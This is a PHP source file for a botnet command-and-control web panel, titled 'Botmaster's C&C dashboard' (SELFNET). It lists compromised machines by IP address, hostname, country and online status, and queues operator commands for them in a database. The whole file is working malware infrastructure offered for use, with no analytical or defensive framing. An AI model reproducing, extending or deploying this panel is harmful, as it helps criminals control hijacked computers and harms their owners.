<?php
	// Test if user is logged
	if (!isset($_SESSION['logged']))
		$_SESSION['logged'] = "false";

	if ($_SESSION['logged'] == "false")
		exit();

	// Check if a new command has to be sent
	if (isset($_POST['content']) && isset($_POST['cmd'])) {
		$content = $_POST['content'];
		$bots = explode('|', $content); // Content contains list of bots

		$sock = getDBSock();

		// Loop of insert in database
		for ($i = 0; $i < count($bots); $i++) {
			$cmd = mysqli_real_escape_string($sock, $_POST['cmd']);
			$bot = mysqli_real_escape_string($sock, $bots[$i]);

			// Execute query
			mysqli_query($sock, "INSERT INTO db_tasks VALUES('".$bot."', '".$cmd."')") or die('Error: '.mysqli_error($sock));
		}

		mysqli_close($sock);
	}

	echo '<div align="center"><img src="images/selfnet.png" height="50" alt="SELFNET" onclick="location.reload();" style="cursor: pointer; margin: 10px 0;"/>';
	echo '<form name="actionform" action="index.php" method="post">';
	echo '<font size="4"><strong>Botmaster\'s C&amp;C dashboard</strong>&nbsp;<input type="button" value="Logoff" onclick="logoff();"/></font>';
	echo '<div style="margin-top: 10px;">';
	echo '<table cellspacing="0" cellpadding="3">';
	echo '<tr><td><input type="checkbox" id="maincheck" onchange="checkboxall(this);"/></td>';
	echo '<td width="15"><strong>#</strong></td>';
	echo '<td><strong>IP address</strong></td>';
	echo '<td width="25"></td>';
	echo '<td width="350"><strong>Computer name</strong></td>';
	echo '<td><strong>Status</strong></td></tr>';

	// For merging query if we want offline bots too
	$addquery = "";
	if ($showoffline == "0")
		$addquery.= "WHERE status=1";
	else
		$addquery.= "WHERE status=0 or status=1";

	// Show dead bots
	if ($showdead == "1")
		$addquery.= " or status=2";

	$sock = getDBSock();

	// Detect offline bots
	$tsoffline = time() - (60 * $botsoffline);
	$request = "UPDATE db_bots SET status=0 WHERE t_on < $tsoffline";
	mysqli_query($sock, $request) or die('Error: '.mysqli_error($sock));

	// Detect dead bots
	$tsdead = time() - (86400 * $botsdead);
	$request = "UPDATE db_bots SET status=2 WHERE t_on < $tsdead";
	mysqli_query($sock, $request) or die('Error: '.mysqli_error($sock));

	// Iterate for bots in database <db_bots>
	$sql = "SELECT * FROM db_bots ".$addquery;
	$result = mysqli_query($sock, $sql) or die('Error: '.mysqli_error($sock)) ;
	$num = 0;

	// Iterating on database for getting bots
	while ($data = mysqli_fetch_array($result)) {
		$num++;

		// Getting bot status (online or offline)
		if ($data['status'] == 0)
			$status = '<img src="images/reddot.png" alt="Offline"/>';
		elseif ($data['status'] == 1)
			$status = '<img src="images/greendot.png" alt="Online"/>';
		else
			$status = '<img src="images/graydot.png" alt="Dead"/>';

		// For semi coloration using the modulo
		if ($num % 2 == 1)
			$color = "#D8D8D8";
		else
			$color = "#EFEFEF";

		// To get country flag of bot
		$cflag = $data['CC'];

		echo '<tr style="background-color: '.$color.';">';
		echo '<td><input onchange="document.getElementById(\'maincheck\').checked=false; return true;" type="checkbox" id="check'.$num.'"/></td>';
		echo '<td>'.$num.'</td>';
		echo '<td>'.$data['ip'].'</td>';
		echo '<td align="right"><img src="images/flags/'.strtolower($cflag).'.png" alt="Flag"/></td>';
		echo '<td>'.$data['hostname'].'</td>';
		echo '<td align="center">'.$status.'<input type="hidden" id="uid'.$num.'" value="'.$data['uid'].'"/></td>';
		echo '</tr>';
	}

	echo '</table><input type="hidden" id="numid" value="'.$num.'"/>';
	echo '<input type="hidden" name="content" id="content" value=""/>';

	// For sending commands
	echo '<table style="margin-top: 10px;"><tr><td>Command:</td><td><select onchange="processChange(this); return true;">';

	// Query to get all commands
	$sql = "SELECT displayname FROM db_commands";
	$result = mysqli_query($sock, $sql) or die('Error: '.mysqli_error($sock)) ;

	// Get all options command
	$first = "";
	while($data = mysqli_fetch_array($result)) {
		$dispName = htmlspecialchars($data['displayname']);
		$dispArray = explode("|", $dispName);
		echo '<option value="'.$dispArray[1].'">'.$dispArray[0].'</option>';

		if ($first == "")
			$first = $dispArray[1];
	}

	mysqli_close($sock);

	echo '</select></td>';
	echo '<td><input type="text" name="cmd" id="cmd" size="30" onkeypress="if (event.keyCode == 13) processSubmit();" value="'.$first.'"/></td>';
	echo '<td><input type="button" value="Send" onclick="processSubmit();"/></td>';
	echo '</tr></table></div></form></div>';
?>
